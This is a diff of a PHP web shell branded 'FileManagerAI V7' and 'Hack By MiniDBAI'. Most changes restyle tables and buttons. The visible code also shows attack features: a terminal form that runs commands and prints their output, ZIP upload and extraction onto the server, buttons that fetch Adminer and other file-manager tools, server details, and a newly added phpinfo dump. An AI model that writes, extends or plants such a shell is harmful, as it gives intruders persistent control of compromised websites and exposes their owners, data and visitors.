@@ -339,8 +339,9 @@ $files = scandir($dir);
     <style>
         body { font-family: Arial, sans-serif; background-color: aliceblue;}
         table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 8px 12px; border: 1px solid #00000000; text-align: left; }
-        th { background-color: #28bb03; }
+        th, td { padding: 8px 12px; border: 1px solid #00000000; font-size: 100%;}
+        th { background-color: #c2e1fb; }
+
 a {
     text-decoration: none;
     color: #007354; /* Warna biru yang lebih lembut */
@@ -376,6 +377,15 @@ input[type="text"], input[type="file"], textarea {
     border-radius: 4px;
 }
 
+button {
+    background-color: #4CAF50;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
 input[type="submit"] {
     background-color: #4CAF50;
     color: white;
@@ -395,25 +405,26 @@ table tr:hover {
 }
 
 
+
     </style>
 
 </head>
 <body>
    <center> <h2>FileManagerAI V7</h2> </center>
 
-
+<div>
   <table>
         <tbody>
             <tr>
-<td>
+<th>
     <!-- Tombol Logout -->
 	<form action="" method="post">
 		<input type="submit" name="logout" value="Logout">
     	</form>
-</td>
+</th>
 
 
-<td>
+<th>
 
 <?php
 // URL file yang akan diunduh
@@ -461,9 +472,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['download_adminer'])) 
     <input type="submit" name="download_adminer" value="Adminer">
 </form>
 
-</td>
+</th>
 
-<td>
+<th>
 
 <?php
 if (isset($_POST['create_tiny'])) {
@@ -519,11 +530,11 @@ if (isset($_POST['create_tiny'])) {
 
 
 
-</td>
+</th>
 
 
 
-<td>
+<th>
 
 <?php
 if (isset($_POST['create_FM-MiniDBAI'])) {
@@ -579,10 +590,10 @@ if (isset($_POST['create_FM-MiniDBAI'])) {
 
 
 
-</td>
+</th>
 
 
-<td>
+<th>
 
 <?php
 if (isset($_POST['create_MiniDBAI'])) {
@@ -638,9 +649,9 @@ if (isset($_POST['create_MiniDBAI'])) {
 
 
 
-</td>
+</th>
 
-<td>
+<th>
 <?php
 if (isset($_POST['download_wp'])) {
     $wp_zip_url = 'https://wordpress.org/latest.zip';
@@ -706,15 +717,19 @@ if (isset($_POST['download_wp'])) {
 
 
 
-</td>
+</th>
 
-<td>
+
+
+
+
+<th>
 <div style="text-align: right;">
     <a target="_blank" rel="noopener noreferrer" href="https://bukakartu.id/minidbai">
         <img src="https://bukakartu.id/assets/img/615845_1725364953.webp" width="109" height="145" alt="Deskripsi Gambar">
     <br>Hack By MiniDBAI</a>
 </div>
-</td>
+</th>
             </tr>
         </tbody>
     </table>
@@ -733,23 +748,7 @@ if (isset($_POST['download_wp'])) {
 </td>
 
 
-<td>
 
-<!-- Form untuk mengunggah dan mengekstrak file ZIP -->
-    <form action="?dir=<?php echo ($dir); ?>" method="post" enctype="multipart/form-data">
-        <label>Upload and extract ZIP file:  <?php
-if (class_exists('ZipArchive')) {
-    echo "ZipArchive ON.";
-} else {
-    echo "ZipArchive OFF.";
-}
-?>
-</label>
-        <input type="file" name="zip_file" required>
-        <input type="submit" value="Extract ZIP">
-    </form>
-
-</td>
 
 <td>
     <!-- Form untuk membuat direktori baru -->
@@ -758,6 +757,30 @@ if (class_exists('ZipArchive')) {
         <input type="text" name="new_dir" required>
         <input type="submit" value="Submit">
     </form>
+</td>
+
+
+
+
+<td>
+
+<!-- Form untuk mengunggah dan mengekstrak file ZIP -->
+    <form action="?dir=<?php echo ($dir); ?>" method="post" enctype="multipart/form-data">
+        <label>Upload + extract ZIP </label>
+
+<?php
+if (class_exists('ZipArchive')) {
+    echo "<label>ZipArchive ON</label>";
+} else {
+    echo "<label>ZipArchive OFF</label>";
+}
+?>
+
+
+        <input type="file" name="zip_file" required>
+        <input type="submit" value="Extract ZIP">
+    </form>
+
 </td>
 
 
@@ -779,6 +802,7 @@ if (class_exists('ZipArchive')) {
             </tr>
         </tbody>
     </table>
+
     <!-- Form untuk mengganti nama file atau direktori -->
     <?php if (isset($_GET['rename'])): ?>
         <h3>ReName</h3>
@@ -960,8 +984,14 @@ echo "" . htmlspecialchars($direktori_sekarang);
         </tr>
     <?php endforeach; ?>
 </table>
-
+</div>
 <br>
+
+<div class="center">
+
+<table>
+    <tr>
+	<td>
 
 
 <?php
@@ -1089,7 +1119,58 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     echo '<pre>' . htmlspecialchars($output) . '</pre>';
 }
 ?>
+<br>
+    <!-- PHP Info Button -->
+<center>
+        <form method="POST" action="">
+            <button type="submit" name="action" value="phpinfo" class="input">Show PHP Info</button>
+        </form>
+</center>
+		</td>
+	</tr>
+</table>
 
+<?php
+if (isset($_POST['action']) && $_POST['action'] == 'phpinfo') {
+    ob_start(); // Start output buffering
+    phpinfo(); // Generate phpinfo output
+    $phpinfo = ob_get_clean(); // Store the output in a variable
+
+    // Use regex to extract the body content and styles
+    if (preg_match('%<style type="text/css">(.*?)</style>.*<body>(.*?)</body>%is', $phpinfo, $matches)) {
+        $phpinfo_style = $matches[1]; // Extract the CSS from phpinfo()
+        $phpinfo_content = $matches[2]; // Extract the body content
+    } else {
+        $phpinfo_style = '';
+        $phpinfo_content = $phpinfo;
+    }
+
+    // Create custom CSS for phpinfo in iframe
+    $custom_css = "
+        body { font-family: Arial, sans-serif; font-size: 14px; color: #333; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 8px; border: 1px solid #ddd; }
+        th { background-color: #f2f2f2; }
+    ";
+
+    // Display phpinfo in an iframe with custom CSS
+    echo "<center><iframe style='width:80%; height:800px; border:none;' srcdoc='
+        <html>
+        <head>
+            <style>
+                $phpinfo_style /* Original phpinfo CSS */
+                $custom_css /* Custom CSS */
+            </style>
+        </head>
+        <body>
+            $phpinfo_content
+        </body>
+        </html>'></iframe></center>";
+}
+?>
+
+    
+	
 
 <?php
 // Menampilkan informasi server
@@ -1126,6 +1207,11 @@ echo "<p><strong>HTTPS:</strong> " . (isset($_SERVER['HTTPS']) ? 'Ya' : 'Tidak')
 
 ?>
 
+		
+	
+<table>
+	<tr>
+		<td>
 
 <form method="post">
     <label for="terminalCommand"> Terminal :</label><br>
@@ -1218,6 +1304,11 @@ if (isset($_POST['submit'])) {
     </pre>
 
 
+		</td>
+	</tr>
+</table>
+
+</div>
 <center>[<a target="_blank"  href="https://bukakartu.id/minidbai">minidbai</a>]</center>
 </body>
 </html>
